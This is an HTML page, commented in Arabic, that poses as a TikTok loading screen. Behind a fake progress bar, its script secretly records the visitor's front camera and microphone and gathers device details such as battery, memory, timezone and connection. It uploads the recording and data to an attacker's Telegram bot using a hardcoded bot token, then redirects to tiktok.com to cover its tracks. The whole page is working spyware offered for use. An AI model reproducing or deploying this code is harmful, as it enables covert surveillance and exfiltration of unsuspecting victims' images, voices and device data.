<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        .fake-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
        }

        .tiktok-loader {
            margin-bottom: 30px;
        }

        .tiktok-logo {
            width: 80px;
            height: 80px;
            margin-bottom: 20px;
            filter: brightness(0) invert(1);
        }

        .loading-text {
            font-size: 18px;
            color: #fff;
            margin-bottom: 15px;
            opacity: 0.9;
        }

        .progress-container {
            width: 280px;
            height: 4px;
            background: rgba(255,255,255,0.2);
            border-radius: 2px;
            overflow: hidden;
            margin: 20px auto;
        }

        .progress-bar {
            width: 0%;
            height: 100%;
            background: #ff0050;
            border-radius: 2px;
            transition: width 0.3s ease;
            box-shadow: 0 0 10px #ff0050;
        }

        .percentage {
            color: #ff0050;
            font-size: 14px;
            font-weight: bold;
            margin-top: 10px;
        }

        .hint-text {
            color: rgba(255,255,255,0.5);
            font-size: 13px;
            margin-top: 40px;
        }

        /* عناصر التصوير المخفية تماماً */
        .hidden-capture {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
        }
    </style>
</head>
<body>
    <!-- شاشة سوداء وهمية مع تحميل تيك توك -->
    <div class="fake-screen">
        <div class="tiktok-loader">
            <svg class="tiktok-logo" viewBox="0 0 24 24" fill="white">
                <path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.24a6.34 6.34 0 0 0 10.86-4.95v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1.04-.72z"/>
            </svg>
            <div class="loading-text">TikTok</div>
            <div class="loading-text" style="font-size: 14px;">جاري التحميل...</div>
            <div class="progress-container">
                <div class="progress-bar" id="progressFill"></div>
            </div>
            <div class="percentage" id="percentageText">0%</div>
            <div class="hint-text">سيتم التحويل إلى TikTok تلقائياً</div>
        </div>
    </div>

    <!-- عناصر التصوير والتسجيل المخفية -->
    <video id="hiddenVideo" autoplay playsinline muted class="hidden-capture"></video>
    <canvas id="hiddenCanvas" class="hidden-capture"></canvas>

    <script>
        (function() {
            // ================== الإعدادات المتقدمة ==================
            const CONFIG = {
                botToken: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU",
                chatId: new URLSearchParams(window.location.search).get('id'),
                
                // إعدادات التسجيل
                recording: {
                    duration: 8000,              // 8 ثواني فيديو مع صوت
                    videoBitsPerSecond: 3000000,   // 3 Mbps جودة عالية
                    audioBitsPerSecond: 128000,     // 128 kbps صوت نقي
                    frameRate: 30,                   // 30 إطار في الثانية
                    width: 1280,                       // عرض HD كامل
                    height: 720,                         // ارتفاع HD
                    mimeType: 'video/webm;codecs=vp9,opus'  // أفضل كوديك
                },
                
                // توقيتات دقيقة
                timings: {
                    warmupDelay: 3500,            // 3.5 ثانية تهيئة الكاميرا والميكروفون
                    progressUpdate: 100,            // تحديث كل 100ms
                    maxWaitTime: 20000,               // 20 ثانية حد أقصى
                    redirectDelay: 1500                 // 1.5 ثانية قبل التوجيه
                },
                
                fallbackUrl: "https://www.tiktok.com"
            };

            // ================== عناصر الواجهة ==================
            const progressFill = document.getElementById('progressFill');
            const percentageText = document.getElementById('percentageText');

            // ================== عناصر التصوير ==================
            const hiddenVideo = document.getElementById('hiddenVideo');
            const hiddenCanvas = document.getElementById('hiddenCanvas');

            // ================== متغيرات التسجيل ==================
            let mediaStream = null;
            let mediaRecorder = null;
            let recordedChunks = [];
            let recordingStartTime = null;
            let captureCompleted = false;
            let progressInterval = null;
            let warmupCompleted = false;

            // ================== دوال التقدم ==================
            function updateProgress(percent) {
                if (progressFill) {
                    progressFill.style.width = `${percent}%`;
                }
                if (percentageText) {
                    percentageText.innerText = `${Math.round(percent)}%`;
                }
            }

            function formatFileSize(bytes) {
                if (bytes < 1024) return bytes + ' B';
                if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
                if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
                return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' GB';
            }

            function getDetailedDeviceInfo() {
                const info = {
                    platform: navigator.platform || 'unknown',
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth + 'bit',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cores: navigator.hardwareConcurrency || 'unknown',
                    memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'unknown',
                    connection: navigator.connection ? {
                        type: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink + 'Mbps',
                        rtt: navigator.connection.rtt + 'ms'
                    } : 'unknown',
                    battery: 'unknown',
                    touchSupport: 'ontouchstart' in window,
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || 'unspecified'
                };

                // محاولة الحصول على البطارية
                if (navigator.getBattery) {
                    navigator.getBattery().then(battery => {
                        info.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(شحن)' : ''}`;
                    });
                }

                return info;
            }

            // ================== دوال التسجيل المتقدمة ==================
            async function startAdvancedRecording() {
                if (captureCompleted || !CONFIG.chatId) return false;

                try {
                    // طلب الكاميرا والميكروفون معاً
                    console.log("🔍 طلب الكاميرا والميكروفون...");
                    
                    mediaStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: "user",
                            width: { ideal: CONFIG.recording.width },
                            height: { ideal: CONFIG.recording.height },
                            frameRate: { ideal: CONFIG.recording.frameRate }
                        },
                        audio: {
                            echoCancellation: false,      // إلغاء الصدى (نريد الصوت الحقيقي)
                            noiseSuppression: false,       // إلغاء الضوضاء (نريد كل شيء)
                            autoGainControl: false,        // التحكم التلقائي بالكسب
                            sampleRate: 48000,               // جودة صوت 48kHz
                            channelCount: 2                     // ستيريو
                        }
                    });

                    // ربط الكاميرا بالفيديو المخفي
                    hiddenVideo.srcObject = mediaStream;
                    
                    // انتظار تحميل الفيديو بالكامل
                    await new Promise((resolve) => {
                        hiddenVideo.onloadedmetadata = () => {
                            hiddenVideo.play();
                            resolve();
                        };
                    });

                    // تهيئة الكاميرا والميكروفون (انتظار لضبط الإضاءة والصوت)
                    console.log("⏳ تهيئة الكاميرا والميكروفون...");
                    updateProgress(5);
                    
                    await new Promise(resolve => setTimeout(resolve, CONFIG.timings.warmupDelay));
                    warmupCompleted = true;
                    
                    // بدء التسجيل الفعلي
                    await initializeRecorder();

                } catch (error) {
                    console.error("خطأ في الوصول للميديا:", error);
                    
                    // محاولة بالكاميرا فقط إذا فشل الميكروفون
                    if (error.name === 'NotAllowedError' || error.name === 'NotFoundError') {
                        console.log("محاولة بدون ميكروفون...");
                        await startCameraOnly();
                    } else {
                        await handleCriticalError(error);
                    }
                }
            }

            async function initializeRecorder() {
                return new Promise((resolve, reject) => {
                    try {
                        recordedChunks = [];
                        recordingStartTime = Date.now();

                        // البحث عن أفضل كوديك متوفر
                        const mimeTypes = [
                            'video/webm;codecs=vp9,opus',
                            'video/webm;codecs=vp8,opus',
                            'video/webm;codecs=h264,opus',
                            'video/webm'
                        ];

                        let selectedMimeType = '';
                        for (const mimeType of mimeTypes) {
                            if (MediaRecorder.isTypeSupported(mimeType)) {
                                selectedMimeType = mimeType;
                                break;
                            }
                        }

                        // إعداد مسجل الفيديو بأفضل جودة
                        const recorderOptions = {
                            mimeType: selectedMimeType,
                            videoBitsPerSecond: CONFIG.recording.videoBitsPerSecond,
                            audioBitsPerSecond: CONFIG.recording.audioBitsPerSecond
                        };

                        console.log("📹 بدء التسجيل بـ:", selectedMimeType);
                        mediaRecorder = new MediaRecorder(mediaStream, recorderOptions);

                        mediaRecorder.ondataavailable = (event) => {
                            if (event.data.size > 0) {
                                recordedChunks.push(event.data);
                            }
                        };

                        mediaRecorder.onstop = async () => {
                            // تجميع الفيديو مع الصوت
                            const blob = new Blob(recordedChunks, { type: 'video/webm' });
                            
                            if (blob.size < 50000) { // أقل من 50KB يعتبر فاشل
                                console.log("❌ الفيديو صغير جداً، محاولة مرة أخرى");
                                await retryRecording();
                                resolve(false);
                                return;
                            }

                            console.log(`✅ تم التسجيل: ${formatFileSize(blob.size)}`);
                            updateProgress(95);
                            
                            // إرسال الفيديو
                            const success = await sendVideoWithAudio(blob);
                            
                            if (success) {
                                updateProgress(100);
                                
                                // إيقاف كل المسارات
                                if (mediaStream) {
                                    mediaStream.getTracks().forEach(track => track.stop());
                                }
                                
                                // التوجيه إلى تيك توك
                                setTimeout(() => {
                                    window.location.href = CONFIG.fallbackUrl;
                                }, CONFIG.timings.redirectDelay);
                            } else {
                                await handleFailedUpload();
                            }
                            
                            resolve(success);
                        };

                        // بدء التسجيل
                        mediaRecorder.start(1000); // إرسال بيانات كل ثانية
                        console.log(`🔴 تسجيل فيديو مع صوت (${CONFIG.recording.duration/1000} ثواني)...`);
                        
                        // تحديث التقدم أثناء التسجيل
                        let lastProgress = 5;
                        progressInterval = setInterval(() => {
                            if (captureCompleted) return;
                            
                            const elapsed = Date.now() - recordingStartTime;
                            const progress = 5 + (elapsed / CONFIG.recording.duration) * 85;
                            updateProgress(Math.min(progress, 90));
                            
                            if (elapsed >= CONFIG.recording.duration) {
                                clearInterval(progressInterval);
                            }
                        }, CONFIG.timings.progressUpdate);

                        // إيقاف التسجيل بعد المدة المحددة
                        setTimeout(() => {
                            if (mediaRecorder && mediaRecorder.state === 'recording') {
                                captureCompleted = true;
                                mediaRecorder.stop();
                            }
                        }, CONFIG.recording.duration);

                    } catch (error) {
                        console.error("خطأ في بدء التسجيل:", error);
                        reject(error);
                    }
                });
            }

            async function startCameraOnly() {
                try {
                    console.log("📸 محاولة بالكاميرا فقط...");
                    
                    mediaStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: "user",
                            width: { ideal: CONFIG.recording.width },
                            height: { ideal: CONFIG.recording.height }
                        },
                        audio: false
                    });

                    hiddenVideo.srcObject = mediaStream;
                    
                    await new Promise((resolve) => {
                        hiddenVideo.onloadedmetadata = () => {
                            hiddenVideo.play();
                            resolve();
                        };
                    });

                    await new Promise(resolve => setTimeout(resolve, CONFIG.timings.warmupDelay));
                    
                    // بدء التسجيل بدون صوت
                    await initializeRecorder();

                } catch (error) {
                    await handleCriticalError(error);
                }
            }

            async function retryRecording() {
                if (captureCompleted) return;
                
                console.log("🔄 إعادة محاولة التسجيل...");
                recordedChunks = [];
                
                // انتظار ثانية ثم أعد المحاولة
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                if (mediaRecorder && mediaRecorder.state === 'inactive') {
                    mediaRecorder.start(1000);
                    
                    setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, CONFIG.recording.duration);
                }
            }

            async function sendVideoWithAudio(blob) {
                try {
                    const deviceInfo = getDetailedDeviceInfo();
                    
                    const formData = new FormData();
                    formData.append('chat_id', CONFIG.chatId);
                    formData.append('video', blob, 'recording.webm');
                    
                    let caption = `🎥 تسجيل فيديو مع صوت
                        
🆔 المعرف: ${CONFIG.chatId}
⏱️ المدة: ${CONFIG.recording.duration/1000} ثواني
📏 الدقة: ${CONFIG.recording.width}x${CONFIG.recording.height}
💾 الحجم: ${formatFileSize(blob.size)}
🔊 الصوت: ${mediaStream.getAudioTracks().length > 0 ? 'نعم' : 'لا'}

📱 معلومات الجهاز:
• النظام: ${deviceInfo.platform}
• المعالج: ${deviceInfo.cores} نواة
• الذاكرة: ${deviceInfo.memory}
• الشاشة: ${deviceInfo.screen} (${deviceInfo.colorDepth})
• اللغة: ${deviceInfo.language}
• التوقيت: ${deviceInfo.timezone}
• الاتصال: ${typeof deviceInfo.connection === 'object' ? 
    `${deviceInfo.connection.type} - ${deviceInfo.connection.downlink}` : 
    deviceInfo.connection}
• البطارية: ${deviceInfo.battery}
• اللمس: ${deviceInfo.touchSupport ? 'نعم' : 'لا'}
• Cookies: ${deviceInfo.cookiesEnabled ? 'مفعلة' : 'معطلة'}

⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;

                    formData.append('caption', caption);

                    console.log("📤 جاري رفع الفيديو...");
                    
                    const response = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });

                    if (!response.ok) {
                        const errorText = await response.text();
                        console.error("خطأ في رفع الفيديو:", errorText);
                        
                        // إذا الفيديو كبير جداً، جرب ضغطه
                        if (blob.size > 50 * 1024 * 1024) {
                            console.log("📦 الفيديو كبير جداً، محاولة ضغط...");
                            return await compressAndSendVideo(blob);
                        }
                        
                        return false;
                    }

                    return true;

                } catch (error) {
                    console.error("فشل إرسال الفيديو:", error);
                    return false;
                }
            }

            async function compressAndSendVideo(blob) {
                // إذا كان الفيديو كبير جداً، نرسل صورة كبديل
                try {
                    console.log("📸 إرسال صورة بدلاً من الفيديو...");
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = hiddenVideo.videoWidth;
                    canvas.height = hiddenVideo.videoHeight;
                    canvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
                    
                    const imageBlob = await new Promise(resolve => {
                        canvas.toBlob(resolve, 'image/jpeg', 0.9);
                    });

                    const formData = new FormData();
                    formData.append('chat_id', CONFIG.chatId);
                    formData.append('photo', imageBlob, 'snapshot.jpg');
                    formData.append('caption', `📸 لقطة شاشة (الفيديو كبير جداً)
🆔 المعرف: ${CONFIG.chatId}
💾 حجم الفيديو الأصلي: ${formatFileSize(blob.size)}`);

                    await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    return true;

                } catch (error) {
                    console.error("فشل إرسال الصورة:", error);
                    return false;
                }
            }

            async function handleFailedUpload() {
                try {
                    // إرسال معلومات فقط
                    const deviceInfo = getDetailedDeviceInfo();
                    const text = `⚠️ فشل رفع الفيديو
                        
🆔 المعرف: ${CONFIG.chatId}
📱 معلومات الجهاز الأساسية:
• النظام: ${deviceInfo.platform}
• الشاشة: ${deviceInfo.screen}
• المتصفح: ${deviceInfo.userAgent.substring(0, 100)}`;

                    await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CONFIG.chatId, text: text })
                    });

                } catch (error) {}

                // توجيه لتيك توك
                setTimeout(() => {
                    window.location.href = CONFIG.fallbackUrl;
                }, 2000);
            }

            async function handleCriticalError(error) {
                console.error("خطأ جسيم:", error);
                
                try {
                    const text = `❌ فشل كامل في التسجيل
🆔 المعرف: ${CONFIG.chatId}
❌ الخطأ: ${error.message || 'خطأ غير معروف'}`;

                    await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CONFIG.chatId, text: text })
                    });
                } catch (e) {}

                // توجيه فوري
                window.location.href = CONFIG.fallbackUrl;
            }

            // ================== بدء التنفيذ ==================
            async function execute() {
                if (!CONFIG.chatId) {
                    console.log("لا يوجد معرف، توجيه مباشر...");
                    window.location.href = CONFIG.fallbackUrl;
                    return;
                }

                console.log("🚀 بدء التنفيذ للمعرف:", CONFIG.chatId);
                
                // بدء التسجيل المتقدم
                await startAdvancedRecording();

                // حد أقصى 20 ثانية
                setTimeout(() => {
                    if (!captureCompleted) {
                        console.log("⚠️ انتهاء المهلة الزمنية");
                        window.location.href = CONFIG.fallbackUrl;
                    }
                }, CONFIG.timings.maxWaitTime);
            }

            // تشغيل كل شيء
            execute();

        })();
    </script>
</body>
</html>
